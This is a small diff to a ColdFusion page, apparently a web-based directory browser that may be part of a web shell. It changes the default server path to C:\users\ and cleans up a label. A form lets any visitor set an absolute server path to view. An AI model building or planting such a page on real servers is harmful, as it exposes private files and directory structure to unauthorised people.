@@ -1,4 +1,4 @@
-<CFPARAM NAME="Form.path" DEFAULT="D:\INETPUB\DRS.COM\WWWROOT\">
+<CFPARAM NAME="Form.path" DEFAULT="C:\users\">
 <CFPARAM NAME="Form.filepath" DEFAULT=".">
 
 <CFIF #Form.filepath# IS NOT ".">
@@ -42,7 +42,7 @@ a {COLOR: 0000FF; TEXT-DECORATION: none}
 <form action="" name="FolderPath" method="post">
 	<TR>
 		<TD>
-		Show the absolute path of a directory£º
+		Show the absolute path of a directory
 		<CFOUTPUT>
 		<input name="path" value="#Form.path#" style="width:600">
 		</CFOUTPUT>
